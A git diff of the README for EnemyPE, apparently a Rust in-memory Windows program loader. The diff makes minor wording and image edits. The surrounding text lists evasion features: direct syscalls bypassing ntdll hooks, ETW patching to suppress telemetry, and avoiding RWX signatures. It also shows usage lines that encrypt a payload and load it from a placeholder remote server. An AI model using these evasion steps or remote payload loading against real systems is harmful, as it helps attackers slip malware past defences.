@@ -1,4 +1,4 @@
-# EnemyPE — Manual Windows PE Loader
+# EnemyPE — Windows PE Loader
 
 [![Rust](https://img.shields.io/badge/language-Rust-orange)](https://www.rust-lang.org)
 [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
@@ -18,7 +18,7 @@ Manual Windows PE loader written in Rust. Parses PE headers, maps sections into 
 - Thread-based execution handoff to OEP
 - Supports both x86 (PE32) and x64 (PE32+) binaries
 
-### Evasion (Phase 1)
+### Evasion 
 - **Staged memory protection** — All allocations start as `PAGE_READWRITE`, then each section is re-protected according to its characteristics (`.text` → RX, `.data` → RW, `.rdata` → R), eliminating RWX signatures
 - **Direct syscall (x64)** — `NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx`, and `NtWaitForSingleObject` invoked via `syscall` instruction with dynamically-resolved SSNs, bypassing userland hooks in `ntdll.dll`
 - **ETW patching** — Disables `EtwEventWrite` in `ntdll.dll` at startup to suppress telemetry
@@ -30,6 +30,8 @@ Manual Windows PE loader written in Rust. Parses PE headers, maps sections into 
 - **Encrypt utility** — Built-in `--encrypt` flag to XOR-encrypt local files for hosting
 
 ---
+![Preview](images/1.png)
+![Preview](images/2.png)
 
 ## Build
 
@@ -101,7 +103,6 @@ EnemyPE.exe --encrypt payload.exe
 # Step 3: Load from URL (auto-decrypts in-memory)
 EnemyPE.exe --x64 https://your-server.com/payload.exe.enc
 ```
-## IMAGE
 
 **Error: mismatched architecture**
 ```
@@ -159,7 +160,6 @@ This project is for **educational and security research purposes only**. The aut
 ---
 
 ## Author
-
 **wanmywann**
 
 ---
